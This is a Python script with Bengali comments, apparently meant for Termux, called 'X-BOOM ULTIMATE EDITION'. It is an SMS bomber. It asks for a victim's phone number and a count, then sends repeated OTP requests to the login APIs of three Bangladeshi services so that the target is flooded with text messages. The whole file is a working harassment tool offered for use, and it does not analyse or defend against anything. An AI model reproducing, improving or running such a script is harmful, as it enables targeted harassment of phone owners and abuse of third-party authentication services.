import requests
import os
import time
import random

# কালার কোড (টারমাক্স সুন্দর দেখানোর জন্য)
r = "\033[1;31m"
g = "\033[1;32m"
y = "\033[1;33m"
w = "\033[1;37m"

def banner():
    os.system('clear')
    print(f"{g}========================================")
    print(f"{y}        X-BOOM ULTIMATE EDITION         ")
    print(f"{y}     Bypass: Enabled | WiFi & PC        ")
    print(f"{g}========================================{w}")

def send_sms(target, count):
    # সচল এবং শক্তিশালী API লিস্ট
    apis = [
        {"url": "https://api.sharetrip.net/api/v1/otp/send", "data": {"mobileNumber": target, "type": "login"}},
        {"url": "https://api.shikho.com/api/v1/auth/send-otp", "data": {"phone": target, "type": "login"}},
        {"url": "https://api.fundesh.com.bd/api/auth/send-otp", "data": {"phoneNumber": target, "service": "LOGIN"}}
    ]
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 12; Pixel 6)",
        "Content-Type": "application/json"
    }

    print(f"\n{g}[+] Attack Started on: {target}{w}")
    for i in range(count):
        api = random.choice(apis)
        try:
            # রিকোয়েস্ট পাঠানো
            res = requests.post(api["url"], json=api["data"], headers=headers, timeout=10)
            if res.status_code == 200:
                print(f"{g}[!] SMS {i+1} Sent Successfully!{w}")
            else:
                print(f"{r}[?] SMS {i+1} Failed (Blocked){w}")
        except:
            print(f"{r}[-] Connection Error{w}")
        
        time.sleep(5) # ৫-৭ সেকেন্ড গ্যাপ জরুরি

def main():
    banner()
    num = input(f"{y}Enter Number: {w}")
    amount = int(input(f"{y}Enter Amount: {w}"))
    send_sms(num, amount)

if __name__ == "__main__":
    main()

  


